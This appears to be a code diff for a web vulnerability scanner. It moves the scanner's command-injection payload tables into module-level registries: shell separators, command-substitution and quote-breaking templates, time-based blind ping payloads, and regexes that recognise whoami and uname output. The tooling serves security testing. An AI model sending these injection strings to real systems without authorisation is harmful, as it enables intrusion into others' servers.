@@ -19,6 +19,75 @@ logger = logging.getLogger(__name__)
 
 
 
+
+# ─────────────────────────────────────────────────────────────────────────────
+# CMDi payload registry — used by the scanner and the Payloads browser dialog
+# ─────────────────────────────────────────────────────────────────────────────
+_CMDI_OUTPUT_SIGNATURES: List[Tuple[str, str, str]] = [
+    # whoami output
+    (r'\broot\b',                            "whoami → root",          "Unix"),
+    (r'\bwww-data\b',                        "whoami → www-data",      "Unix"),
+    (r'\bnobody\b',                          "whoami → nobody",        "Unix"),
+    (r'\badministrator\b',                   "whoami → administrator", "Windows"),
+    (r'\bnt authority\\system\b',            "whoami → SYSTEM",        "Windows"),
+    (r'\bnt authority\\network service\b',   "whoami → NetworkSvc",    "Windows"),
+    # uname -a output
+    (r'\bLinux\s+\S+\s+\d+\.\d+',           "uname -a output",        "Unix"),
+    (r'\bDarwin\s+\S+\s+\d+\.\d+',          "uname -a macOS",         "Unix"),
+    # ver / Windows version
+    (r'Microsoft Windows \[Version',         "Windows ver output",     "Windows"),
+    # ifconfig / ipconfig
+    (r'inet addr:\d+\.\d+\.\d+\.\d+',       "ifconfig inet addr",     "Unix"),
+    (r'inet \d+\.\d+\.\d+\.\d+',            "ifconfig inet",          "Unix"),
+    (r'IPv4 Address[.\s]+:\s*\d+\.\d+',     "ipconfig IPv4",          "Windows"),
+    # netstat
+    (r'tcp\s+\d+\s+\d+\s+\S+:\d+',         "netstat tcp row",        "Unix"),
+    (r'TCP\s+\d+\.\d+\.\d+\.\d+:\d+',      "netstat TCP row",        "Windows"),
+    # ps -ef
+    (r'UID\s+PID\s+PPID',                   "ps -ef header",          "Unix"),
+    (r'root\s+1\s+0\s+',                    "ps -ef init row",        "Unix"),
+    # tasklist
+    (r'Image Name\s+PID\s+Session',         "tasklist header",        "Windows"),
+    # shell error leaks
+    (r'sh:\s*\d+:',                         "sh: error",              "Unix"),
+    (r'/bin/sh:.*not found',                "sh: not found",          "Unix"),
+    (r"'[^']+' is not recognized",          "Windows cmd error",      "Windows"),
+    (r'The system cannot find',             "Windows file error",     "Windows"),
+]
+
+_CMDI_SEPARATOR_PAYLOADS = [
+    # ── Both platforms ────────────────────────────────────────────
+    ("amp",        "&",   "both"),
+    ("amp_amp",    "&&",  "both"),
+    ("pipe",       "|",   "both"),
+    ("pipe_pipe",  "||",  "both"),
+    # ── Unix only ────────────────────────────────────────────────
+    ("semi",       ";",   "unix"),
+    ("newline",    "\n",  "unix"),
+    # ── Inline execution (Unix) ───────────────────────────────────
+    ("backtick",   "`{CMD}`",          "unix"),
+    ("dollar",     "$({CMD})",         "unix"),
+    # ── Quote Breaking (New) ──────────────────────────────────────
+    ("quote_semi", "'; {CMD}; '",      "unix"),
+    ("dbl_quote_semi", '"; {CMD}; "',  "unix"),
+    ("quote_pipe", "'| {CMD} |'",      "both"),
+    ("dbl_quote_pipe", '"| {CMD} |"',  "both"),
+]
+
+_CMDI_TIME_PAYLOADS: List[Tuple[str, str, int, str]] = [
+    # Unix — ping -c N sends N ICMP packets ≈ N seconds
+    ("unix_ping_amp",      "& ping -c 5 127.0.0.1 &",          5,  "unix"),
+    ("unix_ping_semi",     "; ping -c 5 127.0.0.1 ;",          5,  "unix"),
+    ("unix_ping_pipe",     "| ping -c 5 127.0.0.1 |",          5,  "unix"),
+    ("unix_ping_newline",  "\n ping -c 5 127.0.0.1 \n",        5,  "unix"),
+    ("unix_ping_dollar",   "$(ping -c 5 127.0.0.1)",           5,  "unix"),
+    ("unix_ping_backtick", "`ping -c 5 127.0.0.1`",            5,  "unix"),
+    # Windows — ping -n N sends N packets ≈ N seconds
+    ("win_ping_amp",       "& ping -n 5 127.0.0.1 &",          5,  "windows"),
+    ("win_ping_pipe",      "| ping -n 5 127.0.0.1 |",          5,  "windows"),
+    ("win_ping_amp_amp",   "&& ping -n 5 127.0.0.1",           5,  "windows"),
+]
+
 class CmdiScanMixin:
     """Mixin providing Command Injection scan methods."""
 
@@ -45,61 +114,14 @@ class CmdiScanMixin:
 
         # ── Output signatures ─────────────────────────────────────────────────
         # Each entry: (regex_pattern, description, platform)
-        OUTPUT_SIGNATURES: List[Tuple[str, str, str]] = [
-            # whoami output
-            (r'\broot\b',                            "whoami → root",          "Unix"),
-            (r'\bwww-data\b',                        "whoami → www-data",      "Unix"),
-            (r'\bnobody\b',                          "whoami → nobody",        "Unix"),
-            (r'\badministrator\b',                   "whoami → administrator", "Windows"),
-            (r'\bnt authority\\system\b',            "whoami → SYSTEM",        "Windows"),
-            (r'\bnt authority\\network service\b',   "whoami → NetworkSvc",    "Windows"),
-            # uname -a output
-            (r'\bLinux\s+\S+\s+\d+\.\d+',           "uname -a output",        "Unix"),
-            (r'\bDarwin\s+\S+\s+\d+\.\d+',          "uname -a macOS",         "Unix"),
-            # ver / Windows version
-            (r'Microsoft Windows \[Version',         "Windows ver output",     "Windows"),
-            # ifconfig / ipconfig
-            (r'inet addr:\d+\.\d+\.\d+\.\d+',       "ifconfig inet addr",     "Unix"),
-            (r'inet \d+\.\d+\.\d+\.\d+',            "ifconfig inet",          "Unix"),
-            (r'IPv4 Address[.\s]+:\s*\d+\.\d+',     "ipconfig IPv4",          "Windows"),
-            # netstat
-            (r'tcp\s+\d+\s+\d+\s+\S+:\d+',         "netstat tcp row",        "Unix"),
-            (r'TCP\s+\d+\.\d+\.\d+\.\d+:\d+',      "netstat TCP row",        "Windows"),
-            # ps -ef
-            (r'UID\s+PID\s+PPID',                   "ps -ef header",          "Unix"),
-            (r'root\s+1\s+0\s+',                    "ps -ef init row",        "Unix"),
-            # tasklist
-            (r'Image Name\s+PID\s+Session',         "tasklist header",        "Windows"),
-            # shell error leaks
-            (r'sh:\s*\d+:',                         "sh: error",              "Unix"),
-            (r'/bin/sh:.*not found',                "sh: not found",          "Unix"),
-            (r"'[^']+' is not recognized",          "Windows cmd error",      "Windows"),
-            (r'The system cannot find',             "Windows file error",     "Windows"),
-        ]
+        OUTPUT_SIGNATURES = _CMDI_OUTPUT_SIGNATURES
 
         # ── Payload matrix ────────────────────────────────────────────────────
         # Format: (name, payload_template, technique, platform)
         # {CMD} is replaced with the actual OS command.
         # Separators: & && | || ; \n  and inline execution
 
-        SEPARATOR_PAYLOADS = [
-            # ── Both platforms ────────────────────────────────────────────
-            ("amp",        "&",   "both"),
-            ("amp_amp",    "&&",  "both"),
-            ("pipe",       "|",   "both"),
-            ("pipe_pipe",  "||",  "both"),
-            # ── Unix only ────────────────────────────────────────────────
-            ("semi",       ";",   "unix"),
-            ("newline",    "\n",  "unix"),
-            # ── Inline execution (Unix) ───────────────────────────────────
-            ("backtick",   "`{CMD}`",          "unix"),
-            ("dollar",     "$({CMD})",         "unix"),
-            # ── Quote Breaking (New) ──────────────────────────────────────
-            ("quote_semi", "'; {CMD}; '",      "unix"),
-            ("dbl_quote_semi", '"; {CMD}; "',  "unix"),
-            ("quote_pipe", "'| {CMD} |'",      "both"),
-            ("dbl_quote_pipe", '"| {CMD} |"',  "both"),
-        ]
+        SEPARATOR_PAYLOADS = _CMDI_SEPARATOR_PAYLOADS
 
         COMMANDS = {
             "unix": [
@@ -123,19 +145,7 @@ class CmdiScanMixin:
         # ── Time-based blind payloads ─────────────────────────────────────────
         # Each injects a ping that sleeps for ~N seconds.
         # Format: (name, payload, expected_delay_seconds, platform)
-        TIME_PAYLOADS: List[Tuple[str, str, int, str]] = [
-            # Unix — ping -c N sends N ICMP packets ≈ N seconds
-            ("unix_ping_amp",      "& ping -c 5 127.0.0.1 &",          5,  "unix"),
-            ("unix_ping_semi",     "; ping -c 5 127.0.0.1 ;",          5,  "unix"),
-            ("unix_ping_pipe",     "| ping -c 5 127.0.0.1 |",          5,  "unix"),
-            ("unix_ping_newline",  "\n ping -c 5 127.0.0.1 \n",        5,  "unix"),
-            ("unix_ping_dollar",   "$(ping -c 5 127.0.0.1)",           5,  "unix"),
-            ("unix_ping_backtick", "`ping -c 5 127.0.0.1`",            5,  "unix"),
-            # Windows — ping -n N sends N packets ≈ N seconds
-            ("win_ping_amp",       "& ping -n 5 127.0.0.1 &",          5,  "windows"),
-            ("win_ping_pipe",      "| ping -n 5 127.0.0.1 |",          5,  "windows"),
-            ("win_ping_amp_amp",   "&& ping -n 5 127.0.0.1",           5,  "windows"),
-        ]
+        TIME_PAYLOADS = _CMDI_TIME_PAYLOADS
         TIME_THRESHOLD = 4.0   # seconds — flag if response ≥ this
 
         results: Dict[str, Any] = {
